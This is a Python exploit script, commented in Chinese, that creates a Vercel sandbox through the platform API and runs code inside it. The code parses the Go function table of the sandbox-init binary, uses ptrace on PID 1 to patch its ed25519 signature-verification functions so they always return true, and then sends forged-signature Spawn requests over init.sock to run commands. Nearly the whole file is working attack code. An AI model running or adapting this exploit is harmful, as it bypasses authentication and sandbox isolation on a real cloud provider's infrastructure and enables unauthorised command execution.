# 实验J56: 解析 Go pclntab 找 ed25519.Verify 函数 + ptrace patch 恒真
# 目标: patch 验证函数, 使任意签名通过 init.sock 验证
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj56"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, struct, subprocess, json, time, ctypes, base64

print("===== [1] 解析 pclntab =====", flush=True)
b = open("/run/vercel/share/sandbox-init", "rb").read()
print("binary size: %d" % len(b), flush=True)

magic = b"\xfb\xff\xff\xff"
idxs = [m.start() for m in re.finditer(re.escape(magic), b)]
print("pclntab magic at:", [hex(i) for i in idxs[:5]], flush=True)
if not idxs:
    print("NO PCLNTAB", flush=True)
    raise SystemExit

pcln = idxs[0]
pad = struct.unpack_from("<I", b, pcln+4)[0]
minLC = b[pcln+8]
ptrSize = b[pcln+9]
nfunc, nfiles = struct.unpack_from("<II", b, pcln+10)
off = pcln + 18
if ptrSize == 8:
    textStart = struct.unpack_from("<Q", b, off)[0]; off += 8
else:
    textStart = struct.unpack_from("<I", b, off)[0]; off += 4
funcnameOffset, cuOffset, filetabOffset, pctabOffset, pclnOffset = struct.unpack_from("<IIIII", b, off)
print("ptrSize=%d nfunc=%d textStart=%s" % (ptrSize, nfunc, hex(textStart)), flush=True)
print("offsets: fn=%s cu=%s ft=%s pt=%s pl=%s" % tuple(hex(x) for x in (funcnameOffset, cuOffset, filetabOffset, pctabOffset, pclnOffset)), flush=True)

ftab = pcln + pclnOffset
funcnametab = pcln + funcnameOffset
funcs = []
for j in range(nfunc):
    eoff = ftab + j * (ptrSize + 4)
    entry = struct.unpack_from("<Q" if ptrSize == 8 else "<I", b, eoff)[0]
    funcoff = struct.unpack_from("<I", b, eoff + ptrSize)[0]
    f = ftab + funcoff
    if ptrSize == 8:
        fentry = struct.unpack_from("<Q", b, f)[0]
    else:
        fentry = struct.unpack_from("<I", b, f)[0]
    nameoff = struct.unpack_from("<i", b, f + ptrSize)[0]
    # 名字长度限制
    nstart = funcnametab + nameoff
    nend = b.find(b"\x00", nstart)
    if nend < 0:
        continue
    name = b[nstart:nend].decode("latin1", errors="replace")
    funcs.append((entry, name))
print("parsed funcs: %d" % len(funcs), flush=True)

# 列出感兴趣的函数
targets = []
for entry, name in funcs:
    ln = name.lower()
    if ("ed25519" in ln and "verify" in ln) or "signature" in ln or "timestamp" in ln or "auth" in ln:
        targets.append((entry, name))
        print("FN %s %s" % (hex(entry), name), flush=True)

print("===== [2] ptrace 读目标函数头部指令 =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

# 读前几个候选函数头部
for entry, name in targets[:8]:
    ok, out = ptrace_rw(entry, read_len=16)
    if ok > 0:
        print("HEAD %s %s: %s" % (hex(entry), name, out.hex()), flush=True)

print("===== [3] patch ed25519.Verify 类函数为 mov al,1; ret =====", flush=True)
PATCH = b"\xb0\x01\xc3"  # mov al, 1; ret
patched = []
for entry, name in targets:
    ln = name.lower()
    # 只 patch 明确的 verify 函数
    if "ed25519" in ln and "verify" in ln and "WithOptions" not in name and "der" not in ln:
        ok, total = ptrace_rw(entry, data=PATCH)
        print("PATCH %s %s: %d/%d" % (hex(entry), name, ok, total), flush=True)
        patched.append((entry, name))
print("patched:", [(hex(e), n) for e, n in patched], flush=True)

print("===== [4] 测试 Spawn 调用 =====", flush=True)
def ccall(path, body, hdrs, timeout=10):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", body, "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

ts = str(int(time.time() * 1000))
tests = [
    ("random-sig", {"x-timestamp": ts, "x-signature": base64.b64encode(b"\x99" * 64).decode()}),
    ("empty-sig", {"x-timestamp": ts, "x-signature": ""}),
    ("short-sig", {"x-timestamp": ts, "x-signature": "AAAA"}),
    ("no-ts", {"x-signature": base64.b64encode(b"\x99" * 64).decode()}),
    ("garbage", {"x-timestamp": ts, "x-signature": "###@@@"}),
]
for label, hdrs in tests:
    out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", '{"command":"id"}', hdrs)
    print("[%s] %s" % (label, out[:600].replace("\r\n", " | ")), flush=True)
'''
run_cmd(sid, SCAN, "pclntab-patch-verify", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
